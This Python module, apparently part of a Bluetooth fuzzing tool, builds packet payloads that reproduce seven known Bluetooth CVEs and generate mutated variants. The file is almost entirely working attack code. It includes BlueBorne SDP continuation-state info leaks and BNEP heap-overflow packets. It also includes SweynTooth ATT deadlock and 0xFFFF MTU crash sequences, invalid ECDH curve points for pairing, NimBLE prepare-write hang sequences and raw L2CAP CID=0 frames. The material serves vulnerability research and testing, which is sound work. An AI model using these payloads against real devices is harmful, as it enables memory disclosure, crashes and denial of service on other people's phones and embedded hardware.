"""Targeted CVE Reproduction Strategy — reproduce known Bluetooth CVEs and find variants.

Each CVE method is a generator that yields (payload, description) tuples.
The first yield is always the exact reproduction pattern for the known CVE.
Subsequent yields are VARIATIONS that mutate the key exploited field to
find similar bugs in different implementations.

Multi-step attacks yield (list[bytes], description) where the list contains
payloads to be sent sequentially. The engine sends them in order.

Supported CVEs:
  - CVE-2017-0785: Android SDP info leak via cross-service continuation state
  - CVE-2017-0781: Android BNEP heap overflow via Setup Connection uuid_size
  - SweynTooth CVE-2019-19192: ATT sequential request deadlock
  - SweynTooth ATT Large MTU: Exchange MTU with MTU=0xFFFF allocation crash
  - CVE-2018-5383: Invalid ECDH P-256 curve point in SMP pairing
  - CVE-2024-24746: NimBLE Prepare Write + disconnect infinite loop
  - PerfektBlue CVE-2024-45431: L2CAP CID=0 (raw transport only)

Reference: lessons-from-bluetooth-specifications.md, Section 11
"""

from __future__ import annotations

import os
import struct
from collections.abc import Generator

from blue_tap.modules.fuzzing.mutators import CorpusMutator, FieldMutator
from blue_tap.modules.fuzzing.protocols.att import (
    UUID_CHARACTERISTIC,
    build_exchange_mtu_req,
    build_execute_write_req,
    build_find_info_req,
    build_prepare_write_req,
    build_read_by_type_req,
    build_read_req,
)
from blue_tap.modules.fuzzing.protocols.bnep import (
    BNEP_CONTROL,
    BNEP_SETUP_CONNECTION_REQ,
    build_setup_connection_req,
)
from blue_tap.modules.fuzzing.protocols.sdp import (
    UUID_L2CAP,
    UUID_RFCOMM,
    UUID_SDP,
    build_continuation,
    build_service_search_req,
)
from blue_tap.modules.fuzzing.protocols.smp import (
    AUTH_SC_BOND_MITM,
    IO_NO_INPUT_OUTPUT,
    KEY_DIST_ALL,
    OOB_NOT_PRESENT,
    SMP_PAIRING_PUBLIC_KEY,
    build_pairing_public_key,
    build_pairing_request,
)


# ---------------------------------------------------------------------------
# P-256 curve constants (little-endian for SMP wire format)
# ---------------------------------------------------------------------------

# Generator point G of the NIST P-256 curve, stored little-endian as SMP
# transmits coordinates in LE byte order.
_P256_GX_LE = bytes.fromhex(
    "96c298d84539a1f4a033eb2d817d0377f240a463e5e6bcf847422ce1f2d1176b"
)
_P256_GY_LE = bytes.fromhex(
    "f551bf376840b6cbce5e316b5733ce2b169e0f7c4aeb7e8e9b7f1afe2e342e4f"
)


# ---------------------------------------------------------------------------
# CVE metadata for list_cves()
# ---------------------------------------------------------------------------

_CVE_REGISTRY: list[dict] = [
    {
        "id": "CVE-2017-0785",
        "name": "BlueBorne SDP Information Leak",
        "year": 2017,
        "protocol": "sdp",
        "layer": "L2CAP PSM 1",
        "severity": "high",
        "description": (
            "Android SDP server uses continuation state bytes as a raw memory "
            "offset without bounds checking. Cross-service continuation state "
            "reuse causes out-of-bounds heap read."
        ),
        "method": "cve_2017_0785_sdp_leak",
    },
    {
        "id": "CVE-2017-0781",
        "name": "BlueBorne BNEP Heap Overflow",
        "year": 2017,
        "protocol": "bnep",
        "layer": "L2CAP PSM 15",
        "severity": "critical",
        "description": (
            "Android BNEP parser allocates buffer based on uuid_size field "
            "but reads more data from packet, causing heap overflow."
        ),
        "method": "cve_2017_0781_bnep_heap",
    },
    {
        "id": "CVE-2019-19192",
        "name": "SweynTooth ATT Deadlock",
        "year": 2020,
        "protocol": "ble-att",
        "layer": "L2CAP CID 0x0004",
        "severity": "high",
        "description": (
            "Sequential ATT requests without waiting for responses cause "
            "deadlock in BLE stacks that enforce one-pending-request."
        ),
        "method": "sweyntooth_att_deadlock",
    },
    {
        "id": "SweynTooth-LargeMTU",
        "name": "SweynTooth ATT Large MTU Allocation Crash",
        "year": 2020,
        "protocol": "ble-att",
        "layer": "L2CAP CID 0x0004",
        "severity": "high",
        "description": (
            "Exchange MTU Request with MTU=0xFFFF causes some stacks to "
            "attempt 64KB allocation and crash."
        ),
        "method": "sweyntooth_att_large_mtu",
    },
    {
        "id": "CVE-2018-5383",
        "name": "Invalid ECDH Curve Point",
        "year": 2018,
        "protocol": "ble-smp",
        "layer": "L2CAP CID 0x0006",
        "severity": "critical",
        "description": (
            "During LE Secure Connections, the remote's ECDH public key is "
            "not validated to be on the P-256 curve. An attacker can send "
            "a point not on the curve to derive the shared secret."
        ),
        "method": "cve_2018_5383_invalid_curve",
    },
    {
        "id": "CVE-2024-24746",
        "name": "NimBLE Prepare Write Infinite Loop",
        "year": 2024,
        "protocol": "ble-att",
        "layer": "L2CAP CID 0x0004",
        "severity": "high",
        "description": (
            "Sending Prepare Write Request then disconnecting before Execute "
            "Write causes infinite loop in write queue cleanup."
        ),
        "method": "cve_2024_24746_prepare_write",
    },
    {
        "id": "CVE-2024-45431",
        "name": "PerfektBlue L2CAP CID=0",
        "year": 2024,
        "protocol": "l2cap",
        "layer": "L2CAP",
        "severity": "high",
        "description": (
            "Sending L2CAP frames with CID=0 (null identifier) crashes "
            "stacks that do not validate CID before dispatch. Requires "
            "raw transport (Bumble/Scapy)."
        ),
        "method": "perfektblue_l2cap_cid_zero",
    },
]


# ===========================================================================
# TargetedStrategy
# ===========================================================================

class TargetedStrategy:
    """Reproduce known CVE patterns and generate variations to find similar bugs.

    Each CVE method yields ``(payload, description)`` tuples where payload is
    either ``bytes`` (single packet) or ``list[bytes]`` (multi-step attack
    requiring sequential sends).

    Ordering within each method:
      1. First yield: exact CVE reproduction pattern
      2. Subsequent yields: mutations of the key exploited field

    Usage::

        strategy = TargetedStrategy()
        for payload, desc in strategy.cve_2017_0785_sdp_leak():
            engine.send(payload)

        # Or iterate all CVEs:
        for payload, desc in strategy.generate_all():
            engine.send(payload)
    """

    # ------------------------------------------------------------------
    # CVE-2017-0785: Android SDP Info Leak
    # ------------------------------------------------------------------

    def cve_2017_0785_sdp_leak(
        self,
    ) -> Generator[tuple[bytes | list[bytes], str], None, None]:
        """CVE-2017-0785: Android SDP info leak via continuation state reuse.

        **Root cause**: The Android SDP server stored a raw memory offset in the
        continuation state bytes. It did not validate that the offset was within
        the bounds of the current response buffer.

        **Attack mechanism**:
          1. Send ServiceSearchRequest for UUID_L2CAP (0x0100) with max_count=1
             so the server returns a partial result with continuation state.
          2. Send ServiceSearchRequest for UUID_SDP (0x0001) — which has fewer
             results and thus a smaller response buffer — but attach the
             continuation state from step 1.
          3. The continuation state offset points past the smaller buffer,
             causing an out-of-bounds heap read. Leaked bytes appear in the
             response body.

        **Key parameters**:
          - L2CAP MTU should be small (50 bytes) to force fragmentation and
            ensure the server generates continuation state.
          - UUID_L2CAP (0x0100) for step 1 — many services match, large buffer.
          - UUID_SDP (0x0001) for step 2 — few matches, small buffer.
          - max_count=1 in step 1 forces continuation even with few results.

        **What success looks like**: Response to step 2 contains bytes that do
        not correspond to valid SDP service record handles — these are leaked
        heap data.

        Yields:
            (payload, description) tuples. Multi-step attacks are yielded as
            ``(list[bytes], description)`` where payloads are sent sequentially.
        """
        # --- Exact reproduction ---
        # Step 1: Request L2CAP services with max_count=1 to get continuation state
        step1 = build_service_search_req(
            uuids=[UUID_L2CAP], max_count=1, tid=0x0001,
        )
        # Step 2: Request SDP services with a forged continuation state
        # The real attack captures cont_state from step1's response and replays
        # it here. We simulate with synthetic offsets that mirror the attack.
        # Typical Android cont_state is 2 bytes: big-endian offset into response.
        # Offset 0x0020 (32) is past a typical small SDP response buffer.
        forged_cont = build_continuation(b"\x00\x20")
        step2 = build_service_search_req(
            uuids=[UUID_SDP], max_count=256, continuation=forged_cont, tid=0x0002,
        )
        yield (
            [step1, step2],
            "CVE-2017-0785: exact reproduction — L2CAP->SDP cross-service "
            "continuation state reuse (offset=0x0020)",
        )

        # --- Variations: probe different continuation state offsets ---
        # The key exploited field is the 2-byte offset in the continuation state.
        # Sweep offsets to find the exact boundary where OOB read begins.
        uuid_pairs = [
            (UUID_L2CAP, UUID_SDP, "L2CAP->SDP"),
            (UUID_L2CAP, UUID_RFCOMM, "L2CAP->RFCOMM"),
        ]

        for uuid_a, uuid_b, pair_name in uuid_pairs:
            initial = build_service_search_req(
                uuids=[uuid_a], max_count=1, tid=0x0001,
            )

            # Strategic offset values: powers of 2, page boundaries, near-max
            offsets = [
                0x0000, 0x0001, 0x0008, 0x0010, 0x0018, 0x0020,
                0x0030, 0x0040, 0x0050, 0x0080, 0x00FF, 0x0100,
                0x0200, 0x0400, 0x0800, 0x1000, 0x2000, 0x4000,
                0x7FFF, 0x8000, 0xFFFE, 0xFFFF,
            ]
            for offset in offsets:
                cont = build_continuation(struct.pack(">H", offset))
                followup = build_service_search_req(
                    uuids=[uuid_b], max_count=256, continuation=cont,
                    tid=0x0002,
                )
                yield (
                    [initial, followup],
                    f"CVE-2017-0785 variant: {pair_name} offset=0x{offset:04X}",
                )

        # --- Variations: different continuation state lengths ---
        for cont_len in (1, 3, 4, 8, 16):
            cont_bytes = bytes([0x20]) + b"\x00" * (cont_len - 1)
            cont = build_continuation(cont_bytes[:cont_len])
            followup = build_service_search_req(
                uuids=[UUID_SDP], max_count=256, continuation=cont, tid=0x0002,
            )
            yield (
                [step1, followup],
                f"CVE-2017-0785 variant: continuation length={cont_len}",
            )

        # --- Variations: mutated continuation state bytes ---
        base_cont = b"\x00\x20"
        for i in range(10):
            mutated = FieldMutator.bitflip(base_cont, num_bits=1)
            cont = build_continuation(mutated)
            followup = build_service_search_req(
                uuids=[UUID_SDP], max_count=256, continuation=cont, tid=0x0002,
            )
            yield (
                [step1, followup],
                f"CVE-2017-0785 variant: bitflip mutation #{i+1} "
                f"cont=0x{mutated.hex()}",
            )

    # ------------------------------------------------------------------
    # CVE-2017-0781: Android BNEP Heap Overflow
    # ------------------------------------------------------------------

    def cve_2017_0781_bnep_heap(
        self,
    ) -> Generator[tuple[bytes, str], None, None]:
        """CVE-2017-0781: Android BNEP heap overflow via Setup Connection Request.

        **Root cause**: The Android BNEP parser allocates a buffer based on the
        ``uuid_size`` field in the Setup Connection Request but copies data from
        the L2CAP payload without checking that the actual data length matches
        the allocation. When uuid_size claims a small value but the packet
        contains more data, the extra bytes overflow the heap buffer.

        **Attack mechanism**:
          Send a BNEP Setup Connection Request (control type 0x01) where:
          - uuid_size=2 (UUID16, expects 4 bytes of UUID data: dst + src)
          - Actual packet contains 4 bytes of UUID + N bytes of overflow data

          The parser allocates 4 bytes (2 * uuid_size) but memcpy's the entire
          L2CAP payload, overflowing by N bytes.

        **Protocol field exploited**: The ``uuid_size`` byte (offset 2 in the
        BNEP control frame) and the mismatch between it and actual payload size.

        **What success looks like**: Connection drop, crash, or memory corruption
        detected on the target. Android devices may show a tombstone.

        Yields:
            (payload_bytes, description) tuples.
        """
        # --- Exact reproduction: uuid_size=2 with overflow data ---
        # BNEP_CONTROL(0x01) + SETUP_REQ(0x01) + uuid_size(0x02) +
        # dst_uuid(2) + src_uuid(2) + overflow
        exact = (
            bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, 0x02])
            + b"\x11\x16"  # dst UUID: NAP (0x1116)
            + b"\x11\x15"  # src UUID: PANU (0x1115)
            + b"\x41" * 256  # Overflow: 256 bytes past allocation
        )
        yield (exact, "CVE-2017-0781: exact reproduction — uuid_size=2 with 256B overflow")

        # --- Variation 1: Different uuid_size values with overflow ---
        # uuid_size=0 means 0 bytes allocated, any UUID data overflows
        for uuid_size, expected_data, label in [
            (0, 0, "zero allocation"),
            (1, 2, "1-byte UUIDs, minimal alloc"),
            (2, 4, "UUID16"),
            (4, 8, "UUID32"),
            (16, 32, "UUID128"),
        ]:
            for overflow_size in [1, 16, 64, 256, 512, 1024]:
                if uuid_size == 0:
                    uuid_data = b""
                else:
                    uuid_data = b"\xFF" * (uuid_size * 2)
                payload = (
                    bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, uuid_size])
                    + uuid_data
                    + b"\x41" * overflow_size
                )
                yield (
                    payload,
                    f"CVE-2017-0781 variant: uuid_size={uuid_size} "
                    f"({label}), overflow={overflow_size}B",
                )

        # --- Variation 2: uuid_size claims large, data is small ---
        # Parser may underallocate if it trusts L2CAP length over uuid_size
        for uuid_size in [32, 64, 128, 255]:
            payload = (
                bytes([BNEP_CONTROL, BNEP_SETUP_CONNECTION_REQ, uuid_size])
                + b"\x11\x15\x11\x16"  # Only 4 bytes regardless of claimed size
            )
            yield (
                payload,
                f"CVE-2017-0781 variant: uuid_size={uuid_size} but only 4B of data "
                f"(underflow: parser may read past packet)",
            )

        # --- Variation 3: Use valid builder then append overflow ---
        for overflow_size in [64, 256, 1024]:
            base = build_setup_connection_req(uuid_size=16)
            payload = base + b"\x42" * overflow_size
            yield (
                payload,
                f"CVE-2017-0781 variant: well-formed UUID128 setup + "
                f"{overflow_size}B trailing overflow",
            )

        # --- Variation 4: Byte-level mutations of the exact payload ---
        for i in range(10):
            mutated = CorpusMutator.mutate(exact, num_mutations=2)
            yield (
                mutated,
                f"CVE-2017-0781 variant: corpus mutation #{i+1} of exact payload",
            )

    # ------------------------------------------------------------------
    # SweynTooth: ATT Sequential Request Deadlock
    # ------------------------------------------------------------------

    def sweyntooth_att_deadlock(
        self,
    ) -> Generator[tuple[bytes | list[bytes], str], None, None]:
        """SweynTooth CVE-2019-19192: Sequential ATT requests cause deadlock.

        **Root cause**: The BLE ATT protocol (Core Spec Vol 3, Part F, Section
        3.4.8) specifies that only one ATT request can be pending at a time —
        the client must wait for a response before sending another request.
        Some BLE stack implementations enforce this by entering a "waiting for
        response" state and deadlock when a second request arrives before the
        first is answered.

        **Attack mechanism**:
          Send 2+ ATT Read Requests (opcode 0x0A) in rapid succession without
          waiting for Read Responses. The stack's state machine enters an
          unrecoverable state.

        **Protocol field exploited**: ATT opcode sequencing — any request
        opcode sent while another is pending.

        **What success looks like**: Device becomes unresponsive to all BLE
        communication. May require power cycle to recover. No crash — the
        firmware enters an infinite wait or spin loop.

        Yields:
            Multi-step attacks as ``(list[bytes], description)``.
        """
        # --- Exact reproduction: 2 rapid Read Requests ---
        req1 = build_read_req(0x0001)
        req2 = build_read_req(0x0001)
        yield (
            [req1, req2],
            "SweynTooth CVE-2019-19192: exact reproduction — 2 rapid Read "
            "Requests to handle 0x0001 (no wait for response)",
        )

        # --- Variation 1: Increasing burst sizes ---
        for count in [3, 5, 10, 20, 50]:
            burst = [build_read_req(0x0001) for _ in range(count)]
            yield (
                burst,
                f"SweynTooth deadlock variant: {count} rapid Read Requests "
                f"to handle 0x0001",
            )

        # --- Variation 2: Different handles ---
        for handle in [0x0001, 0x0003, 0x0005, 0x000A, 0xFFFF]:
            burst = [build_read_req(handle) for _ in range(5)]
            yield (
                burst,
                f"SweynTooth deadlock variant: 5 rapid Read Requests "
                f"to handle 0x{handle:04X}",
            )

        # --- Variation 3: Mixed request types ---
        mixed_sequences = [
            (
                [build_read_req(0x0001), build_find_info_req(0x0001, 0xFFFF)],
                "Read + FindInfo",
            ),
            (
                [
                    build_read_req(0x0001),
                    build_read_by_type_req(0x0001, 0xFFFF, UUID_CHARACTERISTIC),
                ],
                "Read + ReadByType",
            ),
            (
                [
                    build_find_info_req(0x0001, 0xFFFF),
                    build_read_by_type_req(0x0001, 0xFFFF, UUID_CHARACTERISTIC),
                    build_read_req(0x0003),
                ],
                "FindInfo + ReadByType + Read",
            ),
            (
                [build_exchange_mtu_req(256), build_read_req(0x0001)],
                "ExchangeMTU + Read (MTU in flight)",
            ),
        ]
        for sequence, label in mixed_sequences:
            yield (
                sequence,
                f"SweynTooth deadlock variant: mixed types — {label}",
            )

        # --- Variation 4: Interleave reads to different handles ---
        interleaved = []
        for h in range(0x0001, 0x0011):
            interleaved.append(build_read_req(h))
        yield (
            interleaved,
            "SweynTooth deadlock variant: 16 reads to sequential handles "
            "0x0001-0x0010",
        )

    # ------------------------------------------------------------------
    # SweynTooth: ATT Large MTU Allocation Crash
    # ------------------------------------------------------------------

    def sweyntooth_att_large_mtu(
        self,
    ) -> Generator[tuple[bytes, str], None, None]:
        """SweynTooth: ATT Exchange MTU with MTU=0xFFFF causes allocation crash.

        **Root cause**: Some BLE stacks attempt to allocate a buffer of
        ``client_mtu`` bytes upon receiving an Exchange MTU Request. When
        MTU=0xFFFF (65535), this causes a 64KB allocation that may fail on
        resource-constrained devices, leading to a null-pointer dereference,
        assertion failure, or out-of-memory crash.

        **Attack mechanism**:
          Send a single Exchange MTU Request (opcode 0x02) with
          ``ClientRxMTU = 0xFFFF``.

        **Protocol field exploited**: The 2-byte ``ClientRxMTU`` field in the
        Exchange MTU Request PDU (bytes 1-2, little-endian).

        **What success looks like**: Device crashes, resets, or becomes
        unresponsive. Some devices may handle it gracefully by capping at
        their own maximum (517 per spec).

        Yields:
            (payload_bytes, description) tuples.
        """
        # --- Exact reproduction ---
        yield (
            build_exchange_mtu_req(0xFFFF),
            "SweynTooth large MTU: exact reproduction — MTU=0xFFFF (65535)",
        )

        # --- Variations: interesting MTU values ---
        interesting_mtus = [
            (0, "zero — may cause division by zero"),
            (1, "below minimum — invalid per spec (min 23)"),
            (22, "one below default minimum"),
            (23, "default minimum — edge of valid range"),
            (255, "uint8 max boundary"),
            (256, "uint8 overflow boundary"),
            (512, "common implementation max"),
            (517, "spec maximum ATT_MTU"),
            (518, "one above spec max"),
            (1024, "power of 2 — common buffer size"),
            (2048, "power of 2"),
            (4096, "page size boundary"),
            (8192, "power of 2"),
            (16384, "power of 2"),
            (32767, "int16 max"),
            (32768, "int16 overflow — sign bit"),
            (65534, "uint16 max - 1"),
        ]
        for mtu, label in interesting_mtus:
            yield (
                build_exchange_mtu_req(mtu),
                f"SweynTooth MTU variant: MTU={mtu} — {label}",
            )

        # --- Variations: mutated Exchange MTU PDUs ---
        base = build_exchange_mtu_req(0xFFFF)
        for i in range(10):
            mutated = FieldMutator.bitflip(base, num_bits=1)
            yield (
                mutated,
                f"SweynTooth MTU variant: bitflip mutation #{i+1}",
            )

    # ------------------------------------------------------------------
    # CVE-2018-5383: Invalid ECDH Curve Point
    # ------------------------------------------------------------------

    def cve_2018_5383_invalid_curve(
        self,
    ) -> Generator[tuple[bytes | list[bytes], str], None, None]:
        """CVE-2018-5383: ECDH public key not validated on P-256 curve.

        **Root cause**: During LE Secure Connections pairing, both sides
        exchange ECDH public keys via SMP Pairing Public Key (code 0x0C).
        The spec requires validating that the received point (X, Y) lies on
        the P-256 curve: ``y^2 = x^3 - 3x + b (mod p)``. Implementations
        that skip this check accept arbitrary points, enabling a
        small-subgroup attack to derive the shared secret.

        **Attack mechanism**:
          1. Send a Pairing Request with SC flag set to initiate Secure
             Connections pairing.
          2. Send a Pairing Public Key with (X, Y) coordinates that are NOT
             on the P-256 curve. If the remote does not validate, it computes
             a shared secret using the invalid point.

        **Protocol fields exploited**: The 32-byte X and 32-byte Y coordinate
        fields in the Pairing Public Key command (code 0x0C, 65 bytes total).

        **What success looks like**: The remote accepts the public key and
        proceeds with pairing (sends its own Public Key and DHKey Check).
        The shared secret is predictable because the invalid point has a
        known small-order subgroup.

        Yields:
            Multi-step attacks as ``(list[bytes], description)``.
        """
        # Build SC pairing request (prerequisite for public key exchange)
        pairing_req = build_pairing_request(
            io_cap=IO_NO_INPUT_OUTPUT,
            oob=OOB_NOT_PRESENT,
            auth_req=AUTH_SC_BOND_MITM,
            max_key_size=16,
            init_key_dist=KEY_DIST_ALL,
            resp_key_dist=KEY_DIST_ALL,
        )

        # --- Exact reproduction: zero point (0, 0) ---
        zero_key = build_pairing_public_key(b"\x00" * 32, b"\x00" * 32)
        yield (
            [pairing_req, zero_key],
            "CVE-2018-5383: exact reproduction — zero point (0,0), "
            "identity element not on P-256 curve",
        )

        # --- Variation 1: All-ones point ---
        yield (
            [pairing_req, build_pairing_public_key(b"\xFF" * 32, b"\xFF" * 32)],
            "CVE-2018-5383 variant: all-0xFF point — not on curve",
        )

        # --- Variation 2: Generator point G ---
        # If accepted, shared_secret = remote_private_key * G = remote_public_key
        # This means we learn their private key operation result.
        yield (
            [pairing_req, build_pairing_public_key(_P256_GX_LE, _P256_GY_LE)],
            "CVE-2018-5383 variant: generator point G — if accepted without "
            "validation, shared secret reveals remote private key relationship",
        )

        # --- Variation 3: Random points (overwhelmingly not on curve) ---
        for i in range(10):
            x = os.urandom(32)
            y = os.urandom(32)
            yield (
                [pairing_req, build_pairing_public_key(x, y)],
                f"CVE-2018-5383 variant: random point #{i+1} "
                f"(X=0x{x[:4].hex()}..., Y=0x{y[:4].hex()}...) — "
                f"statistically not on P-256",
            )

        # --- Variation 4: Edge case points ---
        edge_cases = [
            (b"\x01" + b"\x00" * 31, b"\x00" * 32, "small X=1, Y=0"),
            (b"\x00" * 32, b"\x01" + b"\x00" * 31, "X=0, small Y=1"),
            (b"\x01" + b"\x00" * 31, b"\x01" + b"\x00" * 31, "X=1, Y=1"),
            (os.urandom(32), b"\x00" * 32, "random X, Y=0"),
            (b"\x00" * 32, os.urandom(32), "X=0, random Y"),
        ]
        for x, y, label in edge_cases:
            yield (
                [pairing_req, build_pairing_public_key(x, y)],
                f"CVE-2018-5383 variant: edge case — {label}",
            )

        # --- Variation 5: Public key without prior pairing request ---
        # Tests whether the stack validates pairing state before processing
        # the public key command.
        yield (
            build_pairing_public_key(b"\x00" * 32, b"\x00" * 32),
            "CVE-2018-5383 variant: public key without pairing request "
            "(out-of-sequence state machine test)",
        )

        # --- Variation 6: Truncated public key ---
        for trunc_len in [1, 16, 32, 48, 64]:
            truncated = bytes([SMP_PAIRING_PUBLIC_KEY]) + b"\x00" * trunc_len
            yield (
                [pairing_req, truncated],
                f"CVE-2018-5383 variant: truncated public key "
                f"({trunc_len} of 64 data bytes)",
            )

    # ------------------------------------------------------------------
    # CVE-2024-24746: NimBLE Prepare Write + Disconnect
    # ------------------------------------------------------------------

    def cve_2024_24746_prepare_write(
        self,
    ) -> Generator[tuple[bytes | list[bytes], str], None, None]:
        """CVE-2024-24746: NimBLE Prepare Write + disconnect = infinite loop.

        **Root cause**: When a client sends a Prepare Write Request, the server
        queues the write data for later execution. If the client disconnects
        before sending Execute Write, the cleanup routine for the pending write
        queue enters an infinite loop in NimBLE's implementation.

        **Attack mechanism**:
          1. Send one or more Prepare Write Requests (opcode 0x16) to queue
             partial writes.
          2. Disconnect the L2CAP/BLE connection without sending Execute Write.
          3. The server's cleanup routine loops infinitely trying to process
             the orphaned queue.

        **Protocol field exploited**: The Prepare Write Request's handle and
        offset fields, combined with the absence of a subsequent Execute Write.
        The engine should disconnect after sending these payloads.

        **What success looks like**: Device becomes permanently unresponsive
        after disconnection. Requires power cycle.

        NOTE: The engine must support "send then disconnect" mode. These
        payloads are marked as multi-step where the final implied step is
        disconnection (not included in the payload list).

        Yields:
            (payload, description) tuples. The engine should disconnect after
            sending all payloads in a multi-step sequence.
        """
        # --- Exact reproduction: single Prepare Write, then disconnect ---
        prep = build_prepare_write_req(handle=0x0003, offset=0, value=b"\x41" * 20)
        yield (
            prep,
            "CVE-2024-24746: exact reproduction — single Prepare Write to "
            "handle 0x0003, then disconnect (engine must close connection)",
        )

        # --- Variation 1: Multiple Prepare Writes then disconnect ---
        for count in [2, 5, 10, 50]:
            writes = [
                build_prepare_write_req(
                    handle=0x0003, offset=i * 20, value=b"\x41" * 20,
                )
                for i in range(count)
            ]
            yield (
                writes,
                f"CVE-2024-24746 variant: {count} Prepare Writes (sequential "
                f"offsets), then disconnect",
            )

        # --- Variation 2: Prepare Write with extreme offsets ---
        for offset in [0, 1, 0x7FFF, 0xFFFE, 0xFFFF]:
            prep = build_prepare_write_req(
                handle=0x0003, offset=offset, value=b"\x42" * 20,
            )
            yield (
                prep,
                f"CVE-2024-24746 variant: Prepare Write offset=0x{offset:04X}, "
                f"then disconnect",
            )

        # --- Variation 3: Prepare Write + Execute(cancel) + disconnect ---
        # Some stacks may still have the bug when cancel clears the queue
        # but leaves internal state inconsistent.
        prep = build_prepare_write_req(handle=0x0003, offset=0, value=b"\x41" * 20)
        cancel = build_execute_write_req(flags=0x00)  # Cancel all
        yield (
            [prep, cancel],
            "CVE-2024-24746 variant: Prepare Write + Execute(cancel=0x00), "
            "then disconnect — tests cancel cleanup path",
        )

        # --- Variation 4: Different handles ---
        for handle in [0x0001, 0x0003, 0x0005, 0x000A, 0xFFFE, 0xFFFF]:
            prep = build_prepare_write_req(
                handle=handle, offset=0, value=b"\x43" * 20,
            )
            yield (
                prep,
                f"CVE-2024-24746 variant: Prepare Write to handle "
                f"0x{handle:04X}, then disconnect",
            )

        # --- Variation 5: Large value in Prepare Write ---
        for size in [1, 50, 100, 200, 512]:
            prep = build_prepare_write_req(
                handle=0x0003, offset=0, value=b"\x44" * size,
            )
            yield (
                prep,
                f"CVE-2024-24746 variant: Prepare Write with {size}B value, "
                f"then disconnect",
            )

        # --- Variation 6: Prepare Write + Execute(invalid flags) + disconnect ---
        for flags in [0x02, 0x80, 0xFF]:
            prep = build_prepare_write_req(
                handle=0x0003, offset=0, value=b"\x45" * 20,
            )
            execute = build_execute_write_req(flags=flags)
            yield (
                [prep, execute],
                f"CVE-2024-24746 variant: Prepare Write + "
                f"Execute(flags=0x{flags:02X} invalid), then disconnect",
            )

    # ------------------------------------------------------------------
    # PerfektBlue: L2CAP CID=0
    # ------------------------------------------------------------------

    def perfektblue_l2cap_cid_zero(
        self,
    ) -> Generator[tuple[bytes, str], None, None]:
        """PerfektBlue CVE-2024-45431: L2CAP with CID=0 (null channel).

        **Root cause**: The L2CAP dispatcher uses the Channel ID to route
        incoming frames to the appropriate handler. CID=0 is defined as "Null"
        and must never be used on the wire. Stacks that do not validate CID
        before dispatch may dereference a null handler pointer or index into
        an invalid table entry.

        **Attack mechanism**:
          Construct raw L2CAP frames with CID=0x0000 in the 4-byte L2CAP
          header. This requires bypassing the kernel's L2CAP layer, which
          normally prevents sending to CID=0.

        **IMPORTANT**: These payloads are raw L2CAP frames (Length + CID +
        payload). They CANNOT be sent via normal ``BTPROTO_L2CAP`` kernel
        sockets. The engine must detect this and either:
          a) Use Bumble/Scapy for raw HCI transmission, or
          b) Skip these payloads with a warning.

        **What success looks like**: Stack crash or undefined behavior when
        the CID=0 frame reaches the dispatcher.

        Yields:
            (raw_l2cap_frame_bytes, description) tuples.
        """
        # L2CAP basic frame: Length(2 LE) + CID(2 LE) + Payload
        payloads = [
            (b"", "empty payload"),
            (b"\x00", "single zero byte"),
            (b"\x01\x00", "ATT Error Response opcode in CID=0"),
            (b"\x02\x17\x00", "ATT Exchange MTU in CID=0"),
            (b"\x0A\x01\x00", "ATT Read Request in CID=0"),
            (b"\x01\x01" + b"\x00" * 4, "SMP Pairing Request in CID=0"),
            (b"\xFF" * 48, "48 bytes of 0xFF in CID=0"),
        ]

        for payload, label in payloads:
            # Raw L2CAP frame: length(2 LE) + CID=0(2 LE) + payload
            frame = struct.pack("<HH", len(payload), 0x0000) + payload
            yield (
                frame,
                f"PerfektBlue CVE-2024-45431: CID=0 — {label} "
                f"(requires raw transport)",
            )

        # --- Variations: CID near zero ---
        for cid in [0x0001, 0x0002, 0x0003, 0x003F, 0x0040]:
            payload = b"\x0A\x01\x00"  # ATT Read Request
            frame = struct.pack("<HH", len(payload), cid) + payload
            yield (
                frame,
                f"PerfektBlue variant: CID=0x{cid:04X} — boundary test "
                f"(requires raw transport for non-standard CIDs)",
            )

    # ------------------------------------------------------------------
    # Aggregate generators
    # ------------------------------------------------------------------

    def generate_all(
        self, cve: str | None = None, protocol: str | None = None,
    ) -> Generator[tuple[bytes | list[bytes], str], None, None]:
        """Yield all CVE patterns, optionally filtered by CVE ID or protocol.

        Args:
            cve: Optional filter string. If provided, only yields from CVE
                 methods whose ID contains this substring (case-insensitive).
                 Examples: ``"2017-0785"``, ``"sweyntooth"``, ``"5383"``.
            protocol: Optional protocol name filter. If provided, only yields
                 CVE patterns targeting this protocol (e.g. ``"sdp"``,
                 ``"ble-att"``).

        Yields:
            ``(payload, description)`` tuples from all matching CVE methods.
        """
        methods = [
            ("CVE-2017-0785", "sdp", self.cve_2017_0785_sdp_leak),
            ("CVE-2017-0781", "bnep", self.cve_2017_0781_bnep_heap),
            ("CVE-2019-19192-SweynTooth-Deadlock", "ble-att", self.sweyntooth_att_deadlock),
            ("SweynTooth-LargeMTU", "ble-att", self.sweyntooth_att_large_mtu),
            ("CVE-2018-5383", "ble-smp", self.cve_2018_5383_invalid_curve),
            ("CVE-2024-24746", "ble-att", self.cve_2024_24746_prepare_write),
            ("CVE-2024-45431-PerfektBlue", "l2cap", self.perfektblue_l2cap_cid_zero),
        ]

        for method_id, method_proto, method in methods:
            if cve is not None and cve.lower() not in method_id.lower():
                continue
            if protocol is not None and method_proto != protocol:
                continue
            yield from method()

    def list_cves(self) -> list[dict]:
        """List all supported CVEs with metadata.

        Returns:
            List of dicts with keys: id, name, year, protocol, layer,
            severity, description, method.
        """
        return list(_CVE_REGISTRY)
